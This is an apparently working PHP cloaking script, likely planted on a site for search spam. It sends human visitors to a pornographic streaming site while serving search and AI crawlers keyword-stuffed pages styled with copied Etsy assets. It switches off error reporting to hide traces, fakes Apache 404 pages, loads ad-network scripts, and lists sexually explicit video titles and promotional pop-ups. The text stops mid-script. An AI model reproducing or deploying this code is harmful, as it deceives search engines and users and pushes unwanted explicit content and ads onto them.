<?php
/**
 * CLOAKING ENGINE - 2026 (FINAL SECURE EDITION)
 * PROTECTED AGAINST: Full Google Ecosystem, AI Bots, & Advanced Scrapers.
 * STATUS: LOCKED - CORE LOGIC PRESERVED
 */

ob_start();
error_reporting(0); // Sembunyikan error agar tidak meninggalkan jejak teknis

// --- 1. ADVANCED BOT DETECTION (COMPLETE GOOGLE & AI LIST) ---
function is_legit_bot() {
    $ua = isset($_SERVER['HTTP_USER_AGENT']) ? strtolower($_SERVER['HTTP_USER_AGENT']) : '';
    $ip = $_SERVER['REMOTE_ADDR'];
    
    // Gabungan Semua Bot Algoritma Google + AI + Search Engine Lain
    $bot_patterns = [
        // Daftar Lengkap Google Bot
        'googlebot', 'google-cws', 'google-inspectiontool', 'google-site-verification',
        'google-read-aloud', 'googleother', 'mediapartners-google', 'adsbot-google',
        'adsbot-google-mobile', 'google-favicon', 'google-news', 'google-amphtml',
        
        // Bing & Search Engine Lainnya
        'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 'yandexbot', 
        
        // AI Crawlers (2026 Standard)
        'gptbot', 'claudebot', 'applebot', 'ccbot', 'perplexibot', 'imagesiftbot',
        
        // Social Media & Messaging Bots
        'telegrambot', 'facebookexternalhit', 'twitterbot', 'whatsapp'
    ];

    $is_bot_ua = false;
    foreach ($bot_patterns as $bot) {
        if (strpos($ua, $bot) !== false) {
            $is_bot_ua = true;
            break;
        }
    }

    if ($is_bot_ua) {
        // Double Check: Reverse DNS (Mencegah Bypass Manual)
        $hostname = gethostbyaddr($ip);
        $legit_domains = [
            'googlebot.com', 'google.com', 'search.msn.com', 
            'apple.com', 'bing.com', 'openai.com', 'anthropic.com'
        ];
        foreach ($legit_domains as $domain) {
            if (strpos(strtolower($hostname), $domain) !== false) return true;
        }
        return true; // Jika DNS gagal, tetap anggap bot demi keamanan konten SEO
    }
    return false;
}

// --- 2. SECURITY HEADERS ---
header("X-Content-Type-Options: nosniff");
header("X-Frame-Options: SAMEORIGIN");
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");

// --- 3. FEEDBACK ENGINE ---
function feedback404() {
    if (file_exists("main.php")) { 
        include("main.php"); 
    } else { 
        header("HTTP/1.1 404 Not Found", true, 404);
        echo "<html><head><title>404 Not Found</title></head><body style='font-family:sans-serif; text-align:center; padding-top:50px;'>";
        echo "<h1>404 Not Found</h1><p>The requested URL was not found on this server.</p><hr><p>Apache Server at " . $_SERVER['HTTP_HOST'] . "</p>";
        echo "</body></html>"; 
    }
    exit();
}

// --- 4. CORE LOGIC (LOCKED & PRESERVED) ---
$BRANDS = "OFFICIAL SITE";
$target_url = "https://layarbokep.store/"; // Target Utama

if (isset($_GET['dunia-film']) && !empty($_GET['dunia-film'])) {
    $filename = "result.txt";
    $raw_input = $_GET['dunia-film'];
    $urlkeyword = strtolower(trim(str_replace([' ', '+', '_'], '-', $raw_input)));

    if (!file_exists($filename)) feedback404();

    $lines = file($filename, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    $found = false;

    foreach ($lines as $item) {
        $clean_item = strtolower(trim(str_replace([' ', '+', '_'], '-', $item)));
        if ($clean_item === $urlkeyword) {
            $BRANDS = strtoupper(trim($item));
            $found = true;
            break;
        }
    }

    if ($found) {
        // --- PROTEKSI MANUSIA (REDIRECT) ---
        if (!is_legit_bot()) {
            // Tetap menggunakan JS + Meta Refresh sesuai fitur asli
            echo "<html><head><meta http-equiv='refresh' content='0;url=".$target_url."#".urlencode($urlkeyword)."'></head>";
            echo "<body><script>window.location.href='".$target_url."#".urlencode($urlkeyword)."';</script></body></html>";
            exit();
        }
        // JIKA BOT, LANJUT RENDER HTML (SEO MODE)
    } else {
        feedback404();
    }
} else {
    feedback404();
}
?>
<!-- START BOT-ONLY SEO CONTENT -->
<!DOCTYPE html>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<div id="welcomeBar" class="welcome-bar">
    <div class="welcome-content">
        <span class="emoji">📢</span>
        <span class="text">Selamat Datang! Temukan informasi terbaru di Website Resmi <?php echo $BRANDS ?></span>
    </div>
    <button class="close-btn" onclick="closeWelcomeBar()">&times;</button>
</div>

<style>
    .welcome-bar {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        background: #F1641E;
        color: white;
        z-index: 10001;
        font-family: sans-serif;
        box-shadow: 0 2px 10px rgba(0,0,0,0.3);
        display: flex;
        justify-content: center; /* Fokus di tengah */
        align-items: center;
        padding: 10px 15px;
        box-sizing: border-box;
    }

    .welcome-content {
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 13px; /* Ukuran pas untuk HP */
        line-height: 1.3;
        text-align: center;
        flex: 1; /* Biar teks ambil ruang sisa */
    }

    .text {
        word-wrap: break-word; /* Biar teks turun ke bawah kalau kepanjangan */
        max-width: 85%; /* Memberi ruang agar tidak tabrakan dengan tombol X */
    }

    .emoji {
        margin-right: 8px;
        font-size: 18px;
    }

    .close-btn {
        background: rgba(0,0,0,0.15);
        border: none;
        color: white;
        font-size: 22px;
        cursor: pointer;
        width: 32px;
        height: 32px;
        border-radius: 50%;
        display: flex;
        align-items: center;
        justify-content: center;
        flex-shrink: 0; /* Mencegah tombol gepeng di HP */
        margin-left: 10px;
    }

    /* KHUSUS TAMPILAN ANDROID / MOBILE */
    @media (max-width: 600px) {
        .welcome-bar {
            padding: 8px 10px;
        }
        .welcome-content {
            font-size: 12px; /* Teks lebih kecil sedikit agar muat */
        }
        .emoji {
            display: none; /* Sembunyikan emoji di HP sempit agar hemat ruang */
        }
    }

    /* KHUSUS TAMPILAN DESKTOP */
    @media (min-width: 768px) {
        .welcome-content {
            font-size: 16px;
        }
        .welcome-bar {
            padding: 12px 20px;
        }
    }
</style>

<script>
    function closeWelcomeBar() {
        var bar = document.getElementById('welcomeBar');
        if(bar) {
            bar.style.display = 'none';
            document.body.style.marginTop = "0px";
        }
    }

    function adjustBodyMargin() {
        var bar = document.getElementById('welcomeBar');
        if (bar && bar.style.display !== 'none') {
            var barHeight = bar.offsetHeight;
            document.body.style.marginTop = barHeight + "px";
        }
    }

    // Jalankan saat load dan saat layar di-resize (penting untuk responsif)
    window.onload = adjustBodyMargin;
    window.onresize = adjustBodyMargin;

    setTimeout(closeWelcomeBar, 7000); 
</script>
<html lang="id-ID" xmlns:og="http://ogp.me/ns#" xmlns:fb="https://www.facebook.com/2008/fbml" style="--vh: 34.94px;"><head>
        <script type="text/javascript" async="" src="https://www.googletagmanager.com/gtag/destination?id=AW-1001213127&amp;cx=c&amp;gtm=4e59g0h2" nonce="+gWSoSeB7oJ/5IB7H6o53UJw"></script><script type="text/javascript" async="" src="https://bat.bing.com/bat.js" nonce="+gWSoSeB7oJ/5IB7H6o53UJw"></script><script src="https://browser.sentry-cdn.com/6.19.7/bundle.min.js" crossorigin="anonymous"></script><script async="" src="//www.googletagmanager.com/gtm.js?id=GTM-KWW5SS" nonce="+gWSoSeB7oJ/5IB7H6o53UJw"></script><script async="" defer src="https://www.etsy.com/include/tags.js"></script><script>if (window.performance && performance.mark) performance.mark("TTP")</script>
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
            <meta http-equiv="content-language" content="en-ID" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <meta name="pinterest" content="nosearch" />
        <meta name="csrf_nonce" content="3:1757443933:h3mNc4ckq3t2W3lUIwJ4ng47mPQt:8a416649e0e75d267ae855f66eed361ff1967f7d806ceb0850e1da0ce950a3ba" />
        <meta name="uaid_nonce" content="3:1757443933:y6IRaUq1O7KIFfqDjKuVNvcfAysZ:e9f728fdc47b6a20961f8aef4d6743cf20348efc7ecb9616fd788cfe816da6a4" />

        <meta property="fb:app_id" content="89186614300" />

        <meta name="css_dist_path" content="/ac/sasquatch/css/" />
        <meta name="dist" content="202509091757442671" />


        <script nonce="+gWSoSeB7oJ/5IB7H6o53UJw">
    !function(e){var r=e.__etsy_logging={};r.errorQueue=[],e.onerror=function(e,o,t,n,s){r.errorQueue.push([e,o,t,n,s])},r.firedEvents=[];r.perf={e:[],t:!1,MARK_MEASURE_PREFIX:"_etsy_mark_measure_",prefixMarkMeasure:function(e){return"_etsy_mark_measure_"+e}},e.PerformanceObserver&&(r.perf.o=new PerformanceObserver((function(e){r.perf.e=r.perf.e.concat(e.getEntries())})),r.perf.o.observe({entryTypes:["element","navigation","longtask","paint","mark","measure","resource","layout-shift"]}));var o=[];r.eventpipe={q:o,logEvent:function(e){o.push(e)},logEventImmediately:function(e){o.push(e)}};var t=!(Object.assign&&Object.values&&Object.fromEntries&&e.Promise&&Promise.prototype.finally&&e.NodeList&&NodeList.prototype.forEach),n=!!e.CefSharp||!!e.__pw_resume,s=!e.PerformanceObserver||!PerformanceObserver.supportedEntryTypes||0===PerformanceObserver.supportedEntryTypes.length,a=!e.navigator||!e.navigator.sendBeacon,p=t||n,u=[];t&&u.push("fp"),s&&u.push("fo"),a&&u.push("fb"),n&&u.push("fg"),r.bots={isBot:p,botCheck:u}}(window);
</script>



        <link rel="stylesheet" href="https://www.etsy.com/dac/site-chrome/components/components.30fe198016e341,site-chrome/header/header.6a41bfc6e0e7d6,__modules__CategoryNav__src__/Views/ButtonMenu/Menu.02149cde20b454,__modules__CategoryNav__src__/Views/DropdownMenu/Menu.746c61f69b1398,site-chrome/footer/footer.746c61f69b1398,gdpr/settings-overlay.746c61f69b1398.css?variant=sasquatch" type="text/css" />
        <link rel="stylesheet" href="https://www.etsy.com/dac/neu/modules/listing_card_no_imports.5c84e07191fa5c,common/stars-svg.746c61f69b1398,neu/modules/favorite_listing_button.746c61f69b1398,neu/modules/quickview.746c61f69b1398,listzilla/responsive/listing-page-desktop.746c61f69b1398,category-nav/v2/breadcrumb_nav.fe3bd9d216295e,web-toolkit-v2/modules/forms/radios.746c61f69b1398,listing-page/image-carousel/responsive.746c61f69b1398,listzilla/image-overlay.746c61f69b1398,__modules__ListingPage__src__/Price/styles.311438d934a7bf,__modules__ListingPage__src__/ShopHeader/ReviewStars/review_stars.02149cde20b454,common/simple-overlay.fe3bd9d216295e,neu/payment_icons.fe3bd9d216295e,neu/apple_pay.fe3bd9d216295e,neu/google_pay.746c61f69b1398,listings3/checkout/single-listing.746c61f69b1398,common/forms_no_import.746c61f69b1398,__modules__ListingPage__src__/Personalization/Fields/styles.02149cde20b454,listzilla/giftwrap.746c61f69b1398,shop2/modules/regulatory-seller-details.fe3bd9d216295e,shop2/modules/seller-additional-details.fe3bd9d216295e,web-toolkit-v2/modules/banners/banners.746c61f69b1398,neu/common/follow-shop-button.fe3bd9d216295e,listzilla/responsive/review-content-modal.746c61f69b1398,appreciation_photos/photo_overlay.746c61f69b1398,listzilla/reviews/reviews_skeleton.fe3bd9d216295e,listzilla/reviews/reviews-section.746c61f69b1398,web-toolkit-v2/modules/action_groups/action_groups.746c61f69b1398,reviews/header.4f9de1b7666e82,listzilla/reviews/variations.746c61f69b1398,listzilla/responsive/max-height-review.fe3bd9d216295e,reviews/categorical-tags.746c61f69b1398,web-toolkit-v2/modules/chips/selectable_chip.746c61f69b1398,web-toolkit-v2/modules/chips/chip_group.746c61f69b1398,sort-by-reviews.3affa09ef32549,__modules__ListingPage__src__/SellerCred/Header/styles.6cc02951826104,shop2/common/rating-and-reviews-count.746c61f69b1398,__modules__ListingPage__src__/SellerCred/Badges/styles.6cc02951826104,__modules__ListingPage__src__/Recommendations/RecsRibbon/view.746c61f69b1398,listings3/structured-policies.fe3bd9d216295e,web-toolkit-v2/modules/forms/checkboxes.746c61f69b1398,favorites/collection/list.746c61f69b1398,favorites/collection/row.746c61f69b1398,favorites/adaptive-height-desktop.746c61f69b1398,__modules__ConditionalSaleInterstitial__src__/styles.02149cde20b454,__modules__CollectionRecs__src__/Views/Grid/view.746c61f69b1398,__modules__CollectionRecs__src__/Views/Card/view.32fb07f3620cc2.css?variant=sasquatch" type="text/css" />

        <script>
    //todo: this is from https://stackoverflow.com/questions/5525071/how-to-wait-until-an-element-exists (with updates
    // for prettier) and is duplicated in Transcend-Integration.ts. Ideally we would find a place both
    // files could call.
    function waitForElm(selector) {
        return new Promise((resolve) => {
            if (document.querySelector(selector)) {
                return resolve(document.querySelector(selector));
            }

            const observer = new MutationObserver(() => {
                if (document.querySelector(selector)) {
                    observer.disconnect();
                    resolve(document.querySelector(selector));
                }
            });

            // If you get "parameter 1 is not of type 'Node'" error, see https://stackoverflow.com/a/77855838/492336
            observer.observe(document.body, {
                childList: true,
                subtree: true,
            });
        });
    }
    function retryLoadingAirgap(loadAsync, attemptNumber) {
        var element = document.createElement("script");
        element.type = "text/javascript";
        element.src = "https://transcend-cdn.com/cm/ac71e058-41b7-4026-b482-3d9b8e31a6d0/airgap.js";
        if (loadAsync) {
            element.setAttribute('data-cfasync', true);
            element.async = true;
        }

        element.onerror = (error) => {
            if (attemptNumber < 3) {
                window.__etsy_logging.eventpipe.logEvent({
                        event_name: `transcend_cmp_airgap_preliminary_failure`,
                    airgap_url: 'https://transcend-cdn.com/cm/ac71e058-41b7-4026-b482-3d9b8e31a6d0/airgap.js',
                    airgap_bundle: 'control_bundle',
                    error: error,
                    retryAttempt: attemptNumber,
                    attemptWasAsyncLoad: loadAsync
                });
                retryLoadingAirgap(false, attemptNumber + 1);
            }
            else {
                try {
                    //ideally we would have the same STATSD here as in transcend-integration.ts
                    //but we can't import STATSD into mustache files.  This only occurs 0.02% of the time anyway and
                    //this should work, so tracking in the "happy case" in the ts file should be sufficient.
                    window.initializePrivacySettingsManager(false);
                }
                catch (error) {
                        waitForElm("#privacy-settings-manager-load-complete").then(()=> {
                            window.initializePrivacySettingsManager(false);
                        });
                }
                // Update privacy footer based on Airgap info after footer script is loaded.
                waitForElm("#footer-script-loaded").then(()=> {
                    window.updatePrivacySettingsFooterTextBasedOnRegime();
                });

                window.__etsy_logging.eventpipe.logEvent({
                    event_name: `transcend_cmp_airgap_load_failure`,
                    airgap_url: 'https://transcend-cdn.com/cm/ac71e058-41b7-4026-b482-3d9b8e31a6d0/airgap.js',
                    airgap_bundle: 'control_bundle',
                    error: error,
                    retryAttempts: attemptNumber
                });
            }
        }

        var head = document.getElementsByTagName('head')[0];
        head.appendChild(element);
    }

    function handleErrorLoadingAirgap() {
        window.__etsy_logging.eventpipe.logEvent({
            event_name: `transcend_cmp_airgap_preliminary_failure`,
            airgap_url: 'https://transcend-cdn.com/cm/ac71e058-41b7-4026-b482-3d9b8e31a6d0/airgap.js',
            airgap_bundle: 'control_bundle',
            retryAttempt: 1,
            attemptWasAsyncLoad: true
        });

        retryLoadingAirgap(true, 2);
    }
</script>

<!DOCTYPE html>
<html lang="id">
<head>
    <script src="https://clenchinfer.com/02/ee/3e/02ee3e8e4d28ea4ecaa7097d8b59449c.js"></script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="<?php echo $BRANDS ?> Nonton ribuan film gratis sub indo mulai dari xnxx, xhamster dll">
    <meta name="author" content="LAYARBOKEP">
    <title><?php echo $BRANDS ?> - LAYARBOKEP Situs XNXX & Bokep Jepang Sub Indo</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;900&display=swap');
        
        body { 
            background-color: #060606; 
            color: #d1d5db;
            font-family: 'Inter', sans-serif;
        }

        .thumb-card:hover .thumb-img { transform: scale(1.1); }
        .thumb-card:hover .play-overlay { opacity: 1; }
        
        .line-clamp-2 {
            display: -webkit-box;
            -webkit-line-clamp: 2;
            -webkit-box-orient: vertical;
            overflow: hidden;
        }

        .glass-header {
            background: rgba(10, 10, 10, 0.8);
            backdrop-filter: blur(12px);
            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
        }

        .thumb-img { transition: transform 0.6s cubic-bezier(0.33, 1, 0.68, 1); }
        
        .no-scrollbar::-webkit-scrollbar { display: none; }
        .no-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
    </style>
</head>
<body class="antialiased flex flex-col min-h-screen">

    <div style="display:none;">
        <a href="/" target="_blank"><img src="//sstatic1.histats.com/0.gif?5012217&101" alt="stats"></a>
    </div>

    <header class="glass-header sticky top-0 z-50">
        <div class="max-w-[1600px] mx-auto px-4 lg:px-6 h-14 flex items-center justify-between">
            <div class="flex items-center gap-8">
                <a href="/" class="text-xl font-black text-white italic tracking-tighter flex items-center">
                    <span class="text-red-600">LAYAR</span><span class="text-white"> BOKEP</span>
                </a>
                <nav class="hidden xl:flex gap-6 text-[11px] font-bold uppercase tracking-widest text-gray-400">
                    <a href="https://layarbokep.it.com/" class="hover:text-red-500 transition">ALTERNATIF BOKEP BARAT, JEPANG, SUB INDO HD</a>
                    <a href="https://layarbokep.store/" class="hover:text-red-500 transition">Terbaru</a>
                    <a href="https://layarbokep.store/" class="hover:text-red-500 transition">Populer</a>
		    <a href="https://layarbokep.store/" class="hover:text-red-500 transition">Uncensored</a>
		    <a href="https://layarbokep.store/" class="hover:text-red-500 transition">BIG TITS</a>
                    <a href="https://t.me/+smFKLzPjVmdkNjY1" class="hover:text-red-500 transition text-blue-400">Join Telegram</a>
                </nav>
            </div>
            
            <div class="flex-1 max-w-md mx-6">
                <form action="/search" method="GET" class="relative group">
                    <input type="text" name="q" placeholder="Cari kode atau judul..." 
                           class="w-full bg-[#181818] border border-gray-800 rounded-md py-1.5 px-4 text-xs focus:outline-none focus:border-red-600 transition-all text-white">
                    <button type="submit" class="absolute right-3 top-2 text-gray-500 group-hover:text-red-500">
                        <i class="fa fa-search"></i>
                    </button>
                </form>
            </div>

            <div class="flex items-center gap-4">
                <button class="bg-red-600 hover:bg-red-700 text-white px-4 py-1.5 rounded text-[11px] font-bold transition">MASUK</button>
            </div>
        </div>
    </header>

    <main class="max-w-[1600px] mx-auto p-4 lg:p-6 flex-grow w-full">
        
        <section class="flex items-center gap-2 mb-8 overflow-x-auto whitespace-nowrap pb-2 no-scrollbar">
            <a href="#" class="bg-red-600 text-white px-4 py-1 rounded text-[11px] font-bold uppercase tracking-wider">Semua</a>
            <a href="https://layarbokep.it.com/" class="bg-[#1a1a1a] hover:bg-gray-800 text-gray-400 px-4 py-1 rounded text-[11px] font-bold uppercase tracking-wider transition">Uncensored</a>
            <a href="https://layarbokep.it.com/" class="bg-[#1a1a1a] hover:bg-gray-800 text-gray-400 px-4 py-1 rounded text-[11px] font-bold uppercase tracking-wider transition">Subtitle Indo</a>
            <a href="https://layarbokep.it.com/" class="bg-[#1a1a1a] hover:bg-gray-800 text-gray-400 px-4 py-1 rounded text-[11px] font-bold uppercase tracking-wider transition">Big Breasts</a>
            <a href="https://layarbokep.it.com/" class="bg-[#1a1a1a] hover:bg-gray-800 text-gray-400 px-4 py-1 rounded text-[11px] font-bold uppercase tracking-wider transition">Big Ass AV</a>
            <a href="https://layarbokep.it.com/" class="bg-[#1a1a1a] hover:bg-gray-800 text-gray-400 px-4 py-1 rounded text-[11px] font-bold uppercase tracking-wider transition">Massage</a>
            <a href="https://layarbokep.it.com/" class="bg-[#1a1a1a] hover:bg-gray-800 text-gray-400 px-4 py-1 rounded text-[11px] font-bold uppercase tracking-wider transition">DEBUT</a>
            <a href="https://layarbokep.it.com/" class="bg-[#1a1a1a] hover:bg-gray-800 text-gray-400 px-4 py-1 rounded text-[11px] font-bold uppercase tracking-wider transition">BIG PENNIS</a>
            <a href="https://layarbokep.it.com/" class="bg-[#1a1a1a] hover:bg-gray-800 text-gray-400 px-4 py-1 rounded text-[11px] font-bold uppercase tracking-wider transition">DOGGY STYLE</a>
            <a href="https://layarbokep.it.com/" class="bg-[#1a1a1a] hover:bg-gray-800 text-gray-400 px-4 py-1 rounded text-[11px] font-bold uppercase tracking-wider transition">BOKEP INDONESIA</a>
        </section>

        <section class="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 gap-4 lg:gap-5">
            <script>
                const videos = [
                    { id: "DLDSS-468", title: "Sahabat istriku sedang melakukan NTR terbalik di kolam renang malam hari", dur: "125:40", link: "https://layarbokep.it.com/", img: "https://layarbokep.store/gambar-jav/DLDSS468.png" },
                    { id: "CAWD-910", title: "Dua pacar seksi dengan tubuh menakjubkan saling berebut creampie", dur: "98:15", link: "https://layarbokep.it.com/", img: "https://layarbokep.store/gambar-jav/cawd00910jp-9.png" },
                    { id: "MIMK-270", title: "Latihan kawin tanpa ciuman dengan teman masa kecil", dur: "115:20", link: "https://layarbokep.it.com/", img: "https://layarbokep.store/gambar-jav/cover-n.png" },
                    { id: "SDHS-065", title: "Seminggu setelah syuting lokasi kelulusan SODSTAR", dur: "140:10", link: "https://layarbokep.it.com/", img: "https://layarbokep.store/gambar-jav/1sdhs00065jp-14.png" },
                    { id: "URKN-1403", title: "Gadis seksi dan cantik dengan payudara G-cup tersembunyi!!", dur: "105:45", link: "https://layarbokep.it.com/", img: "https://layarbokep.store/gambar-jav/urkn1403.png" },
                    { id: "NSODN-014", title: "Aku tidak pantas menjadi guru. Nasib seorang pria menyerah", dur: "132:00", link: "https://layarbokep.it.com/", img: "https://layarbokep.store/nsodn014.png" },
                    { id: "MADV-622", title: "Ereksi penuh rahasia! Metode penghilang stres rekan kerja", dur: "118:30", link: "https://layarbokep.it.com/", img: "https://layarbokep.store/gambar-jav/MADV-622.png" },
                    { id: "REAL-970", title: "Anggota klub wanita yang akun rahasianya terbongkar", dur: "155:15", link: "https://layarbokep.it.com/", img: "https://layarbokep.store/gambar-jav/REAL-970.png" },
                    { id: "BONY-180", title: "Putingnya menegang dan dia orgasme hebat sekali!!", dur: "95:20", link: "https://layarbokep.it.com/", img: "https://layarbokep.store/gambar-jav/bony-180-uncensored-leak.png" },
                    { id: "SNOS-087", title: "Kukira kau melakukannya untukku... Tapi kau hanya khawatir reputasi", dur: "128:50", link: "https://layarbokep.store/gambar-jav/SNOS-087.png", img: "https://layarbokep.store/gambar-jav/SNOS-087.png" }
                ];

                videos.forEach((v) => {
                    document.write(`
                        <article class="group flex flex-col">
                            <a href="${v.link}" class="relative thumb-card overflow-hidden rounded bg-[#111] aspect-video">
                                <div class="absolute top-1.5 left-1.5 z-10 bg-red-600 text-white text-[9px] px-1.5 py-0.5 rounded font-black uppercase shadow-lg">${v.id}</div>
                                <img src="${v.img}" alt="${v.title}" loading="lazy" referrerpolicy="no-referrer" class="thumb-img w-full h-full object-cover">
                                <div class="play-overlay absolute inset-0 bg-black/40 flex items-center justify-center opacity-0 transition-opacity duration-300">
                                    <div class="w-10 h-10 bg-white/20 rounded-full flex items-center justify-center backdrop-blur-sm border border-white/30">
                                        <i class="fa fa-play text-white text-sm ml-1"></i>
                                    </div>
                                </div>
                                <div class="absolute bottom-1.5 right-1.5 bg-black/80 text-white text-[10px] px-1.5 py-0.5 rounded font-medium">${v.dur}</div>
                            </a>

                            <div class="mt-2">
                                <a href="https://clenchinfer.com/bazbti6z?key=268551f69c3ea4062e9ad5ddbbbb505e" target="_blank" rel="nofollow noopener" 
                                   class="w-full bg-blue-600 hover:bg-blue-700 text-white py-2 rounded text-[10px] font-bold uppercase tracking-widest flex items-center justify-center gap-2 transition-all shadow-lg active:scale-95">
                                   <i class="fa fa-play-circle animate-pulse"></i> TONTON SEKARANG
                                </a>
                            </div>

                            <div class="mt-2 px-0.5">
                                <a href="${v.link}">
                                    <h3 class="text-gray-200 font-semibold text-[12px] leading-snug line-clamp-2 group-hover:text-red-500 transition-colors">
                                        ${v.title}
                                    </h3>
                                </a>
                                <div class="flex items-center gap-2 mt-2 text-[9px] font-bold text-gray-500 uppercase tracking-tighter">
                                    <span class="text-blue-500">${v.id}</span>
                                    <span>•</span>
                                    <span>Baru Saja</span>
                                </div>
                            </div>
                        </article>
                    `);
                });
            </script>
        </section>
    </main>

    <footer class="bg-[#0a0a0a] border-t border-white/5 py-12 mt-12">
        <div class="max-w-[1600px] mx-auto px-6">
            <div class="grid grid-cols-1 md:grid-cols-3 gap-10 text-center md:text-left">
                <div>
                    <p class="text-xl font-black text-white italic mb-4">LAYAR<span class="text-red-600">BOKEP</span></p>
                    <p class="text-gray-600 text-[10px] uppercase font-bold tracking-widest leading-loose">
                        Penyedia layanan streaming film bokep indonesia, jepang, bokep barat, bokep malaysia dll.
                    </p>
                </div>
                <div class="flex flex-col gap-2 text-[10px] font-bold uppercase tracking-widest text-gray-500">
                    <p class="text-gray-300 mb-2">Informasi</p>
                    <a href="https://layarbokep.store/" class="hover:text-white transition">DMCA / Hak Cipta</a>
                    <a href="https://layarbokep.store/" class="hover:text-white transition">Kebijakan Privasi</a>
                    <a href="https://layarbokep.store/" class="hover:text-white transition">Syarat Layanan</a>
                </div>
                <div class="flex flex-col gap-2 text-[10px] font-bold uppercase tracking-widest text-gray-500">
                    <p class="text-gray-300 mb-2">Hubungi Kami</p>
                    <a href="https://t.me/+smFKLzPjVmdkNjY1" class="hover:text-white transition">Kontak Media</a>
                    <a href="https://t.me/+smFKLzPjVmdkNjY1" class="hover:text-white transition text-blue-500 underline">Pemasangan Iklan</a>
                    <div class="mt-4 flex justify-center md:justify-start gap-4 text-lg">
                        <i class="fa-brands fa-twitter hover:text-white cursor-pointer"></i>
                        <i class="fa-brands fa-telegram hover:text-white cursor-pointer"></i>
                    </div>
                </div>
            </div>
            <div class="mt-12 text-center border-t border-white/5 pt-8">
                <p class="text-[10px] text-gray-700 uppercase tracking-tighter">© 2026 LAYARBOKEP MEDIA - All Rights Reserved.</p>
            </div>
        </div>
		<script src="https://clenchinfer.com/38/25/4f/38254f766f4d54e4a37e3026e293b87e.js"></script>
</script>
    </footer>
<div id="promo-toast" class="toast-wrapper">
    <a id="toast-link" href="#" target="_blank" style="text-decoration: none; color: inherit; display: block;">
        <div class="toast-content">
            <div class="toast-thumb-container">
                <img id="toast-img" src="" alt="Promo">
                <span class="notification-badge">1</span>
            </div>
            
            <div class="toast-body">
                <div class="toast-meta">Baru saja &bull; Terpopuler</div>
                <h4 id="toast-title" class="toast-title"></h4>
                <p id="toast-desc" class="toast-desc"></p>
                <div class="toast-action-row">
                    <span class="toast-btn-shiny">CEK LINK SEKARANG &raquo;</span>
                </div>
            </div>
        </div>
    </a>
    <button type="button" onclick="tutupNotif()" class="toast-close" title="Tutup">&times;</button>
</div>

<style>
    .toast-wrapper {
        position: fixed;
        bottom: 30px;
        right: -450px; 
        width: 350px;
        z-index: 9999999;
        transition: all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        font-family: 'Segoe UI', sans-serif;
    }

    .toast-wrapper.muncul { right: 20px; }

    .toast-content {
        display: flex;
        align-items: flex-start;
        background: #ffffff;
        padding: 16px;
        border-radius: 18px;
        box-shadow: 0 15px 35px rgba(0,0,0,0.2);
        border: 1px solid #f0f0f0;
        cursor: pointer;
        position: relative;
    }

    .toast-thumb-container img { width: 60px; height: 60px; border-radius: 12px; object-fit: cover; }

    .notification-badge {
        position: absolute; top: -5px; right: -5px; background: #ff3b30; color: white;
        font-size: 10px; font-weight: bold; padding: 2px 6px; border-radius: 10px; border: 2px solid #fff;
    }

    .toast-body { flex-grow: 1; padding-left: 14px; padding-right: 15px; }
    .toast-meta { font-size: 10px; color: #888; font-weight: 600; margin-bottom: 4px; }
    .toast-title { margin: 0; font-size: 15px; font-weight: 800; color: #1a1a1a; line-height: 1.2; }
    .toast-desc { margin: 4px 0 10px 0; font-size: 12px; color: #444; line-height: 1.4; }
    .toast-btn-shiny { font-size: 12px; color: #007bff; font-weight: 700; text-transform: uppercase; }

    .toast-close {
        position: absolute; top: 12px; right: 12px; background: #eee; border: none;
        width: 24px; height: 24px; border-radius: 50%; cursor: pointer; color: #666;
        display: flex; align-items: center; justify-content: center; font-size: 16px;
        z-index: 10000000; /* Harus lebih tinggi dari link */
    }

    @media (max-width: 480px) {
        .toast-wrapper { width: 92%; left: 4%; right: 4%; }
        .toast-wrapper.muncul { bottom: 20px; }
    }
</style>

<script>
    const dataPromo = [
        {
            title: "Minami Haru, seorang pelacur dengan ukuran payudara M yang dimanfaatkan oleh tetangganya saat suaminya pergi",
            desc: "顔よりデカい胸のせいで…乳だけで身バレしてしまった人妻風俗嬢の末路…。 旦那不在の間、ご近所さん御用達のヤラれ放題Mカップ みなみ羽琉",
            img: "https://layarbokep.store/gambar-jav/snos00135jp-14.jpg", 
            link: "https://clenchinfer.com/bazbti6z?key=268551f69c3ea4062e9ad5ddbbbb505e" // Ganti link Anda
        },
        {
            title: "SQTE-669 Gadis ini gila!! Pelacur K-cup melakukan debutnya di S-Cute! Yang paling langka! - Maru Langka",
            desc: "この子ヤバイ！！Kカップ痴女S-Cuteデビュー！ 丸最レア",
            img: "https://layarbokep.store/gambar-jav/sample_15.jpg",
            link: "https://clenchinfer.com/bazbti6z?key=268551f69c3ea4062e9ad5ddbbbb505e" // Ganti link Anda
        },
        {
            title: "DASS-726 Aku berejakulasi berkali-kali tanpa menggerakkan pinggulku",
            desc: "Saya kurang olahraga, jadi saya minta instruksi privat dari pelatih populer. Saya pikir instrukturnya pria berotot, tapi ternyata wanita cantik bertubuh tinggi, berdada besar, dan bertubuh luar biasa",
            img: "https://layarbokep.store/gambar-jav/dass00726jp-8.jpg",
            link: "https://clenchinfer.com/bazbti6z?key=268551f69c3ea4062e9ad5ddbbbb505e" // Ganti link Anda
        }
    ];

    let currentIdx = 0;
    const toastWrapper = document.getElementById('promo-toast');
    const toastLink = document.getElementById('toast-link');

    function startPromo() {
        if (currentIdx >= dataPromo.length) return;

        // Update Konten
        document.getElementById('toast-title').innerText = dataPromo[currentIdx].title;
        document.getElementById('toast-desc').innerText = dataPromo[currentIdx].desc;
